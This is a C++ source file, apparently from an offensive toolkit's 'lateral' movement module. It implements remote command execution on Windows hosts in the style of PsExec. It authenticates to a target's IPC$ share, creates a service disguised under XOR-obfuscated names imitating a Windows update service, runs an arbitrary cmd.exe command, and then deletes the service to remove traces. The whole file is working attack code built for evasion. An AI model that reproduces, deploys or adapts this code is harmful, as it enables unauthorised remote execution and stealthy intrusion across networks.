#include "SvcExec.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include <windows.h>
#include <winnetwk.h>
#include <vector>
#include <thread>
#include <chrono>

#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "advapi32.lib")

namespace lateral {

namespace {
    bool EstablishSession(const std::wstring& target, const std::wstring& user, const std::wstring& pass) {
        if (user.empty()) return true;

        NETRESOURCEW nr = {};
        nr.dwType = RESOURCETYPE_ANY;
        std::wstring remoteName = L"\\\\" + target + L"\\IPC$";
        nr.lpRemoteName = (LPWSTR)remoteName.c_str();

        DWORD res = WNetAddConnection2W(&nr, pass.c_str(), user.c_str(), 0);
        if (res == ERROR_SUCCESS || res == ERROR_SESSION_CREDENTIAL_CONFLICT) {
            return true;
        }
        LOG_ERR("WNetAddConnection2 failed: " + std::to_string(res));
        return false;
    }

    void TerminateSession(const std::wstring& target) {
        std::wstring remoteName = L"\\\\" + target + L"\\IPC$";
        WNetCancelConnection2W(remoteName.c_str(), 0, TRUE);
    }
}

std::string SvcExec(const std::string& target, const std::string& user, const std::string& pass, const std::string& cmd) {
    std::wstring wtarget = utils::s2ws(target);
    std::wstring wuser = utils::s2ws(user);
    std::wstring wpass = utils::s2ws(pass);
    std::wstring wcmd = utils::s2ws(cmd);

    if (!EstablishSession(wtarget, wuser, wpass)) {
        return "ERROR: Failed to establish session to IPC$";
    }

    SC_HANDLE hSCM = OpenSCManagerW(wtarget.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        DWORD err = GetLastError();
        if (!wuser.empty()) TerminateSession(wtarget);
        return "ERROR: OpenSCManager failed: " + std::to_string(err);
    }

    // Obfuscated Service Name: "SystemUpdater"
    std::wstring svcName = utils::xor_wstr(L"\x18\x66\xff\x4a\x2e\x72\xd9\x4e\x2f\x7e\xf8\x5b\x39", 13);
    // Obfuscated Display Name: "Windows System Update Service"
    std::wstring dispName = utils::xor_wstr(L"\x1c\x76\xe2\x5a\x24\x68\xff\x1e\x18\x66\xff\x4a\x2e\x72\xac\x6b\x3b\x7b\xed\x4a\x2e\x3f\xdf\x5b\x39\x69\xe5\x5d\x2e", 29);

    // Command to run: cmd.exe /c [cmd]
    std::wstring fullCmd = L"cmd.exe /c " + wcmd;

    SC_HANDLE hSvc = CreateServiceW(
        hSCM,
        svcName.c_str(),
        dispName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        fullCmd.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hSvc = OpenServiceW(hSCM, svcName.c_str(), SERVICE_ALL_ACCESS);
        }

        if (!hSvc) {
            CloseServiceHandle(hSCM);
            if (!wuser.empty()) TerminateSession(wtarget);
            return "ERROR: CreateService/OpenService failed: " + std::to_string(err);
        }
    }

    std::string result = "SVC_OK";
    if (!StartServiceW(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        // StartService often "fails" with ERROR_SERVICE_REQUEST_TIMEOUT because it's not a real service
        if (err != ERROR_SERVICE_REQUEST_TIMEOUT) {
            result = "ERROR: StartService failed: " + std::to_string(err);
        }
    }

    // Cleanup
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    if (!wuser.empty()) TerminateSession(wtarget);

    return result;
}

} // namespace lateral
